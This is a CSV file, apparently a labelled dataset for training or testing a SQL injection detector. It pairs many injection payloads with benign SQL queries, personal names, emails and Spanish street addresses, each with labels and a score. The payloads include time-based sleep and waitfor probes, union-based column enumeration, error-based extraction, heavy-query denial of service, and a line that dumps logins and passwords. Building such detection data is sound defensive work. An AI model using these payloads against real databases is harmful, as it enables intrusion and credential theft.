"1'||  (  select 'gikt' where 8447  =  8447 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,1.0
royett pratseva,0,0,0.004468253314358248
"-6020'+  (  select isrz where 2489  =  2489 union all select 2489,2489,2489,2489,2489,2489,2489,2489--",1,1,1.0
"-3081""   )    )     )   or 3736  =  1899",1,1,1.0
"1%""  )   and 2006  =  2006",1,1,1.0
vlez acejas,0,0,0.004468253314358248
"-1422%""  )   or make_set  (  9539  =  9519,9519  )   and   (  ""%""  =  """,1,1,0.99
-5327'   )    )     )   or 1606  =  6099,1,1,1.0
select * from flight where becoming between 'copper' and 'yard',0,0,0.0
"-2340%"" order by 1#",1,1,1.0
"  select twoid as id, fell as wherever from party",0,0,0.0
select avg ( scale ) from left,0,0,0.0
select count ( baby ) from recent,0,0,0.0
"1""  )   where 6311  =  6311",1,1,1.0
"  select * from doctor where adventure in  ( 'stuck', 'pull', 'title' )  ",0,0,0.0
solonitsin3@neotelecom.fi,0,0,0.004468253314358248
select * from went where slow between aware09/01/1996exist and route15/31/1996smaller,0,0,0.0
1'+  (  select 'jtvq' where 8288  =  8288 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1,1,1.0
ex8ed2ci3,0,0,0.004468253314358248
-8397'   )    )     )   or 2171  =  4788,1,1,1.0
astor,0,0,0.004468253314358248
select variety ( s ) from choice inner join,0,0,0.0
"1%""   )    )    or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   ""%""  =  """,1,1,1.0
"1'||  (  select 'tkmc' from dual where 9675  =  9675 union all select null,null,null,null--",1,1,1.0
"-2787' union all select 3622,3622,3622,3622,3622,3622,3622,3622,3622,3622#",1,1,1.0
"1'   )    )    and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   'vcvj'  =  'vcvj",1,1,1.0
menospreciativo,0,0,0.004468253314358248
4945,0,0,0.004468253314358248
select avg ( beginning ) from lower select sum ( exchange ) ,0,0,0.0
select avg ( phrase ) from ahead select sum ( related ) ,0,0,0.0
select * from anybody where struck not between 'pull' and 'rabbit',0,0,0.0
confirmar,0,0,0.004468253314358248
2.96618e+15,0,0,0.0
shukuri@velaconsultores.nl,0,0,0.004468253314358248
1'  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  'ayol'  =  'ayol,1,1,1.0
select * from husband where them between '1996-07-01' and '1996-07-31',0,0,0.0
"insert into standard  ( pond, real, tune )  values  ( 'choice', 'sudden', 'tax' )  ",0,0,0.0
"  select * from both where using in  ( 'wheel', 'society', 'instance' )  ",0,0,0.0
select * from leader where stairs between '1996-07-01' and '1996-07-31',0,0,0.0
1'||  (  select 'etvo' from dual where 1557  =  1557,1,1,1.0
"-8544%"" or 6872  =  6872 and ""%""  =  """,1,1,0.9800480467933989
"1'+  (  select 'iyvn' where 9358  =  9358 or elt  (  6272  =  6272,sleep  (  5   )    )     )  +'",1,1,1.0
"1""   )    )    as aamh where 7432  =  7432   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --",1,1,1.0
cobea,0,0,0.004468253314358248
"select sleep  (  5  )   and    (    (   ""%""  =  """,1,1,1.0
lazlo,0,0,0.004468253314358248
sadegh,0,0,0.004468253314358248
"calle alfred nobel, 42 7-g",0,0,0.0
"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 70699 )  order by meta_id asc",0,0,0.0
"  select orders.roperid, employees.pitch, employees.grain from ordersright join employees on orders.employeeid  =  employees.headingid order by orders.loveid",0,0,0.0
select * from day where    not practice = 'depth',0,0,0.0
select * from indeed order by regular desc,0,0,0.0
55,0,0,0.004468253314358248
"c/ alcaices, 23",0,0,0.0
petrie3@menorca.com.kp,0,0,0.0
"  select orders.collectrid, employees.current, employees.kind from ordersright join employees on orders.employeeid  =  employees.settingid order by orders.fourid",0,0,0.0
"1"" where 5552  =  5552 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,1,1.0
"1%'   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   '%'  =  '",1,1,1.0
"1%"" and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,1,1.0
select * from green fetch first 50 percent rows only,0,0,0.0
delete from married where suppose = 'local',0,0,0.0
3ist423o,0,0,0.004468253314358248
select sin ( -1 ) ;,0,0,0.14
select avg ( sat ) from character select sum ( practical ) ,0,0,0.0
"-8491"" where 9043  =  9043 union all select 9043,9043,9043,9043,9043,9043,9043,9043,9043--",1,1,1.0
hervs bediaga,0,0,0.004468253314358248
-3496'   )    )    or 9323  =  9323#,1,1,1.0
"1'   )    )    as ovbz where 3203  =  3203   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  --",1,1,1.0
-9197'  )   or   (  6877  =  8010  )  *8010 and   (  'umwl'  =  'umwl,1,1,1.0
select * from advice,0,0,0.0
fit irizibar,0,0,0.004468253314358248
"-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--",1,1,1.0
8.62225e+15,0,0,0.0
"  select ltrim ( ""     sql tutorial"" )  as lefttrimmedstring; ",0,0,0.0
gourley,0,0,0.004468253314358248
select earn ( s )  from circle union all,0,0,0.0
22200,0,0,0.004468253314358248
indiligencia,0,0,0.004468253314358248
"errekerte 113,",0,0,0.001426650534618391
1'||  (  select 'yhpe' where 8010  =  8010 rlike   (  select   (  case when   (  7910  =  3752  )   then 1 else 0x28 end   )    )     )  ||',1,1,1.0
"-7531'   )    )     )   union all select 6900,6900,6900,6900,6900,6900,6900,6900,6900#",1,1,1.0
select distinct dangerous from give,0,0,0.0
1'  )   where 4003  =  4003,1,1,1.0
select * from rice where bar between '1996-07-01' and '1996-07-31',0,0,0.0
52207398c,0,0,0.004468253314358248
7250,0,0,0.004468253314358248
4.14869e+15,0,0,0.0
-1854'  )   as fmmq where 7326  =  7326 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1,1,1.0
50344,0,0,0.004468253314358248
1'  )   as xrap where 5523  =  5523 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1,1,0.99
birney-warbeck@lamejorplaya.gl,0,0,0.006527024015406931
"1""  )   where 6897  =  6897",1,1,1.0
1;select *,1,0,0.13004802672791815
""" or """"-""",1,1,0.94
"1'   )    )    or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (   'mttj' like 'mttj",1,1,1.0
76150645z,0,0,0.004468253314358248
select * from taste where until = 'heading' fetch first 3 rows only,0,0,0.0
carbajosa de la sagrada,0,0,0.0
"-3699%'   )    )     )   union all select 8241,8241,8241,8241,8241,8241,8241,8241,8241#",1,1,1.0
select distinct recent from mysterious,0,0,0.0
amalio,0,0,0.004468253314358248
select wing ( s from satisfied right join,0,0,0.0
9043,0,0,0.004468253314358248
ajoy,0,0,0.004468253314358248
select count ( * )  as percent,0,0,0.0
"1'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,1,1.0
select count ( several ) from stems,0,0,0.0
"1""  )   union all select null,null--",1,1,1.0
"admin""  )   or   (  ""1""  =  ""1",1,1,0.98
1.92e+15,0,0,0.0
select current_date (  )  + 1;,0,0,0.0
select top 3 * from carefully,0,0,0.0
 update grain set bark = 'tower'where easier = 'coast',0,0,0.0
"1'   )    )    and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,1,1.0
select * from bag where should = 'bar'  or lower = 'difference',0,0,0.0
select top 3 * from fewer where spend = 'library',0,0,0.0
encad7622i6,0,0,0.004468253314358248
1 and 7533  =  7533# absp,1,1,0.9900451374640952
brayam,0,0,0.004468253314358248
7o14c0o,0,0,0.004468253314358248
peda2te1ca,0,0,0.004468253314358248
" select * from users where id  =  1 +$+. union select null,@@version -- 1",1,1,1.0
select top 50 percent * from enter select * from soldier fetch first 50 percent rows onlyselect top 3 * from property,0,0,0.0
select * from told where needed  between 10 and 20,0,0,0.0
"1%"" union all select null--",1,1,1.0
1' and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and 'omlt'  =  'omlt,1,1,1.0
roger,0,0,0.004468253314358248
select * from indeed,0,0,0.0
-6215'  )   or   (  8459  =  8459  )  *4906,1,1,1.0
"  select * from let where plural in  ( 'oil', 'hang', 'fifty' )  ",0,0,0.0
select top 3 * from seldom where fresh = 'piano',0,0,0.0
"select column_name from table1 t1, table1 t2 where condition ;",0,0,0.1
select * from news where where  between 10 and 20,0,0,0.0
-8187'   )    )     )   or 1698  =  2823#,1,1,1.0
1'||  (  select 'svnn' from dual where 8710  =  8710,1,1,1.0
"carrer mestre albages 61,",0,0,0.004468253314358248
 or a  =  a--,1,1,0.9828571428571428
from  ( select distinct death from receive ) ,0,0,0.0
9.15202e+15,0,0,0.0
-5555   )    )    as ldte where 4583  =  4583 order by 1#,1,1,1.0
"-4210""  )   where 2679  =  2679 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --",1,1,1.0
e00u4rda2,0,0,0.004468253314358248
select * from closely where main between 'joined' and 'universe',0,0,0.0
"1%'   )    )    and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   '%'  =  '",1,1,1.0
select dangerous ( s )  from grade union,0,0,0.0
16452,0,0,0.004468253314358248
select avg ( nails ) from off select sum ( bicycle ) ,0,0,0.0
55585768n,0,0,0.004468253314358248
admin' or ',1,1,0.96
"1""   )    )    as ngvf where 9912  =  9912 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,1,1.0
mola guell,0,0,0.004468253314358248
select * from angry where foreign in  ( select smallest from separate ) ,0,0,0.0
1'  )   where 6622  =  6622 order by 1--,1,1,1.0
"1%"" and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and ""%""  =  """,1,1,1.0
aprea@ingenelec.es,0,0,0.004468253314358248
select * from sky where ever = 'baseball'  or worse = 'grow',0,0,0.0
krzyski-wieman@hiperzaragoza.er,0,0,0.006527024015406931
5316,0,0,0.004468253314358248
select were ( s ) from potatoes inner join,0,0,0.0
select top 50 percent * from instance select * from widely fetch first 50 percent rows onlyselect top 3 * from pack,0,0,0.0
select avg ( public ) from gasoline,0,0,0.0
kit,0,0,0.004468253314358248
select * from gift where two between '1996-07-01' and '1996-07-31',0,0,0.0
43791,0,0,0.004468253314358248
paseo arco del ladrillo 48 10?h,0,0,0.0
ordinar,0,0,0.004468253314358248
pujolrs tremosa,0,0,0.004468253314358248
telema,0,0,0.004468253314358248
select top 50 percent * from attack,0,0,0.0
select * from climate where done = 'boat' fetch first 3 rows only,0,0,0.0
1'   )    )    as txxn where 7884  =  7884 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1,1,0.99
select   (  case when   (  1898  =  4705  )   then 1898 else 1/  (  select 0  )   end  )  --,1,1,1.0
bellaguarda,0,0,0.004468253314358248
select * from would fetch first 50 percent rows onlyselect top 3 * from catch,0,0,0.0
select count ( tears ) from might,0,0,0.0
"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 5940 )  order by meta_id asc",0,0,0.0
select * from users where id  =  1 or \.<1 or 1  =  1 -- 1,1,1,1.0
select avg ( theory ) from none,0,0,0.0
end and    (    (     (  3673  =  3673,1,1,1.0
select count ( leather ) from play,0,0,0.0
select top 50 percent * from today select * from taught fetch first 50 percent rows onlyselect top 3 * from improve,0,0,0.0
select count ( go ) from throat,0,0,0.0
"1   )    )    as ynzg where 1926  =  1926 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1,1,1.0
"  select * from consonant where follow in  ( 'opinion', 'copy', 'lunch' )  ",0,0,0.0
select avg ( however ) from nothing,0,0,0.0
select movement ( s from shadow right join,0,0,0.0
1 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  -- knpw,1,1,1.0
-2573   )    )    order by 1#,1,1,1.0
select * from fell where gulf = 'bee',0,0,0.0
33529,0,0,0.004468253314358248
vladamir,0,0,0.004468253314358248
"1"" union all select null,null,null,null,null,null,null#",1,1,1.0
select * from limited where leader = 'farmer',0,0,0.0
select * from  ( select political from declared ) ,0,0,0.0
"1  )   where 1880  =  1880 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1,1,1.0
1' and 2006  =  2006,1,1,0.9900366822906053
select * from chain where education = 'continued' limit 3,0,0,0.0
#name?,1,1,0.6503555108868124
"   select suppose, direction, nor from game where president  is null",0,0,0.0
" select * from users where id  =  1 or ""%;"" or 1  =  1 -- 1",1,1,1.0
"1' or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and 'kjfm'  =  'kjfm",1,1,1.0
waitfor delay '0:0:5' and    (    (   'uvlf'  =  'uvlf,1,1,1.0
select * from couple where paid = 'youth'  and  ( level = 'melted' or long = 'luck' ) ,0,0,0.0
torre-cardela,0,0,0.006527024015406931
select count ( similar ) from similar,0,0,0.0
"   select count ( roll ) , field from die by are",0,0,0.0
delete from likely,0,0,0.0
select * from grain fetch first 3 rows only,0,0,0.0
"alcalde baeza medina, s/n,",0,0,0.0
select * from users where id  =  1 + \+%1 or 1  =  1 -- 1,1,1,1.0
select   (  case when   (  4996  =  1734  )   then 1 else 4996*  (  select 4996 from master..sysdatabases  )   end  )  --,1,1,1.0
"-8080""  )   as nlos where 8917  =  8917 union all select 8917,8917,8917,8917--",1,1,1.0
select * from camp order by ants,0,0,0.0
select * from hand fetch first 3 rows only select top 50 percent * from identity,0,0,0.0
1'+  (  select nxfp where 5006  =  5006,1,1,1.0
select * from alike where broke = 'satellites' fetch first 3 rows only,0,0,0.0
select * from gone where automobile = 'smaller' limit 3,0,0,0.0
1'||  (  select 'adni' from dual where 6611  =  6611,1,1,1.0
"1"" where 8571  =  8571",1,1,0.9200422119037569
or 1  =  1#,1,1,1.0
02906029w,0,0,0.004468253314358248
"insert into automobile  ( zipper, pile, several )  values  ( 'fact', 'below', 'tobacco' )  ",0,0,0.0
"  select * from customers   where country in  ( 'germany', 'france', 'uk' ) ; ",0,0,0.01
18347,0,0,0.004468253314358248
yarela,0,0,0.004468253314358248
select * from completely fetch first 3 rows only,0,0,0.0
select * from central where lesson like '%am%',0,0,0.0
select child from hurt,0,0,0.0
"-4929"" where 6381  =  6381 or 8571  =  8571--",1,1,0.99
"1'  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  'ajkb'  =  'ajkb",1,1,1.0
1%'   )    )     )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  '%'  =  ',1,1,1.0
""" or isnull  (  1/0  )   /*",1,1,0.92
2.77767e+15,0,0,0.0
alfredo calderon 136,0,0,0.004468253314358248
select count ( distinct yes )  from guide,0,0,0.0
"-6595"" order by 1--",1,1,1.0
" select * from users where id  =  1 union select 1 1$,version  (    )   -- 1",1,1,1.0
"1',iif  (  7475  =  7475,1,1/0  )  ",1,1,1.0
"  select * from shaking where them in  ( 'prevent', 'coach', 'writer' )  ",0,0,0.0
select * from population where question = 'certain',0,0,0.0
"-5891 union all select 7103,7103,7103,7103--",1,1,1.0
"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",1,1,0.99
select * from us where history = 'his'  or enough = 'indeed',0,0,0.0
"1"" and sleep  (  5  )  #",1,1,1.0
"calle san isidro labrador 188, 13?h",0,0,0.0
"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (     (  '%'  =  '",1,1,1.0
casasola de arin,0,0,0.0
delete from extra where log = 'population',0,0,0.0
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   '%'  =  '",1,1,1.0
baquerizo amatll,0,0,0.004468253314358248
 union all select @@version--,1,1,0.98
mccreano,0,0,0.004468253314358248
" select * from quietly order by myself asc, beneath desc",0,0,0.0
psklib,0,0,0.004468253314358248
"1"" and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and ""oyuj""  =  ""oyuj",1,1,1.0
select * from color,0,0,0.0
" select * from refused order by function asc, stiff desc",0,0,0.0
1.26952e+15,0,0,0.0
"1""   )    )    as fmul where 7827  =  7827",1,1,1.0
select get ( s )  from smoke union,0,0,0.0
" select customername as customer, contactname as [contact person]  from customers;",0,0,0.0
"1   )    )     )   and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1,1,1.0
5.15574e+15,0,0,0.0
"-3379  )   union all select 4985,4985,4985,4985,4985,4985,4985,4985,4985,4985--",1,1,1.0
1 where 5691  =  5691 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --,1,1,1.0
60928646j,0,0,0.004468253314358248
"  select * from pressure where affect not in  ( 'hair', 'shop', 'labor' )  ",0,0,0.0
1' in boolean mode  ) ,1,1,0.8300900643463314
"1' where 1628  =  1628 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,1,1.0
select   (  case when   (  4780  =  4432  )   then 4780 else 4780*  (  select 4780 from mysql.db  )   end  )  #,1,1,1.0
"1"" where 7631  =  7631 and 4733  =  3439",1,1,0.98
bohord1r,0,0,0.004468253314358248
"1%""   )    )     )   union all select null,null,null,null,null--",1,1,1.0
-7279  )   or 9898  =  9963 and   (  1481  =  1481,1,1,0.99
"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",1,1,1.0
select   (  case when   (  5569  =  9390  )   then 5569 else 1/  (  select 0  )   end  )  --,1,1,1.0
"1  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  2868  =  2868",1,1,1.0
5370,0,0,0.004468253314358248
"  update steam set rabbit =  'slipped', city =  'inside' where cast =  pleasure",0,0,0.01
select   (  case when   (  3773  =  3722  )   then 3773 else 3773*  (  select 3773 from mysql.db  )   end  )  #,1,1,1.0
select chamber,0,0,0.03250505488953901
"1  )   where 4768  =  4768 union all select null,null,null,null,null,null,null,null#",1,1,1.0
"-5320 where 8051  =  8051 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1,1,1.0
-6298' or 4724  =  4876,1,1,1.0
select current_time (  ) ;,0,0,0.0
"  select trap,problem from high where tie = 'danger' union select attempt, inside from hunter",0,0,0.0
waitfor delay '0:0:5'# ogzq,1,1,0.99
"1'  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'wdeu' like 'wdeu",1,1,1.0
1'   )    )    as bewk where 3672  =  3672 or sleep  (  5  )  --,1,1,1.0
select count ( particularlyid ) from bee,0,0,0.0
1'  )   as imgv where 7802  =  7802,1,1,1.0
"-3082""  )   where 1082  =  1082 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1,1,1.0
select * from chemical where might between nor09/01/1996log and zoo15/31/1996potatoes,0,0,0.0
"   select book,field,front,size,it     (  (  such join forty on program.movie =  club.equipment )   inner join oldeston orders.favorite =  tent.thoseid ) ",0,0,0.0
grajear,0,0,0.004468253314358248
select * from master where at = 'baseball',0,0,0.0
select option_value from wp_options where option_name  =  '_transient_timeout_houzez_verification_success' limit 1,0,0,0.0
"1""  )   where 8878  =  8878 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1,1,1.0
jung5,0,0,0.004468253314358248
select count ( depth ) from thousand,0,0,0.0
1'  )   as gogu where 4338  =  4338 union all select null#,1,1,1.0
select avg ( buy ) from equally select sum ( interior ) ,0,0,0.0
"1""   )    )    or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,1.0
"1'+  (  select 'aliz' where 5050  =  5050 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7   )    )   +'",1,1,1.0
"-8347%'  )   union all select 7643,7643,7643--",1,1,1.0
"  select * from aid where do in  ( 'machinery', 'written', 'label' )  ",0,0,0.0
"  select orders.brotherrid, employees.past, employees.support from ordersright join employees on orders.employeeid  =  employees.fenceid order by orders.mailid",0,0,0.0
"  select * from long where contain not in  ( 'southern', 'two', 'desk' )  ",0,0,0.0
select joy ( s )  from willing full outer join,0,0,0.0
"1%""   )    )     )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,1,1.0
aseguir,0,0,0.004468253314358248
select * from upward where sound like '%out%',0,0,0.0
a' or 1  =  1--,1,1,1.0
; begin declare @var varchar  (  8000  )   set @var  =  ':' select @var  =  @var+'+login+'/'+password+' ' from users where login >,1,0,0.29833333333333334
29639,0,0,0.004468253314358248
"1'   )    )     (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (   'dpdz' like 'dpdz",1,1,1.0
"   select coffee, exercise+ ', ' + rock+ ' ' + necessary+ ', ' + parent as smell  from ran",0,0,0.0
"1'  )   where 6774  =  6774 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,1.0
rodionova@movil-google.ga,0,0,0.006527024015406931
"  select skill,bar,goes from seen left join orders on balloon.builtid =  shade.married order by scientist.half",0,0,0.0
select count ( keep )  from musical,0,0,0.0
"-6381%"" or 8571  =  8571--",1,1,1.0
"1%""  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  ""%""  =  """,1,1,1.0
fajardos espuna,0,0,0.004468253314358248
1'  )   where 5331  =  5331,1,1,1.0
"  (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",1,1,0.99
select * from people  where gray not like '[obtain]%',0,0,0.0
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  ""%""  =  """,1,1,1.0
spears,0,0,0.004468253314358248
select * from mouse where not family = 'parts'  and not did = 'planning',0,0,0.0
"1'+  (  select uqdb where 3508  =  3508 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,1,1.0
6091,0,0,0.004468253314358248
select * from swing where cross = 'straight',0,0,0.0
-9668'   )    )    as orfu where 5822  =  5822 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1,1,1.0
select * from dangerous where tears = 'sure' fetch first 3 rows only,0,0,0.0
"once septiembre, 95",0,0,0.004468253314358248
select avg ( disappear )  from nearly  select sum ( porch ) ,0,0,0.0
select * from happy where longer = 'chest'  and  ( doing = 'torn' or horn = 'us' ) ,0,0,0.01
from  ( select distinct terrible from roar ) ,0,0,0.0
blava,0,0,0.004468253314358248
select * from this order by article desc,0,0,0.0
select * from comfortable where driven not like '[read]%',0,0,0.0
select just,0,0,0.00024957571886764606
1   )    )    as cwyb where 3633  =  3633,1,1,1.0
select * from car where five = 'person'  and  ( recently = 'yet' or adult = 'second' ) ,0,0,0.0
"calle daniel florido rodriguez, 105, 2?f",0,0,0.0
"-8943%'  )   union all select 7710,7710#",1,1,1.0
select * from ought fetch first 50 percent rows only,0,0,0.0
select top 50 percent * from body,0,0,0.0
select option_value from wp_options where option_name  =  'options_footer_button_4_link' limit 1,0,0,0.0
montorns de segarra,0,0,0.0
de lagarza delacerda,0,0,0.0
"1  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  6986  =  6986",1,1,1.0
"1   )    )    as jzzo where 7773  =  7773 union all select null,null,null,null,null#",1,1,1.0
1  )   rlike sleep  (  5  )   and   (  5724  =  5724,1,1,1.0
select avg ( feel ) from lion,0,0,0.0
fontanal callarisa,0,0,0.004468253314358248
-8069'   )    )    or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   'qbvz'  =  'qbvz,1,1,1.0
1'   )    )     )   rlike sleep  (  5  )   and    (    (     (  'svuu'  =  'svuu,1,1,1.0
"-6419 union all select 7008,7008,7008,7008,7008--",1,1,1.0
1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1,1,1.0
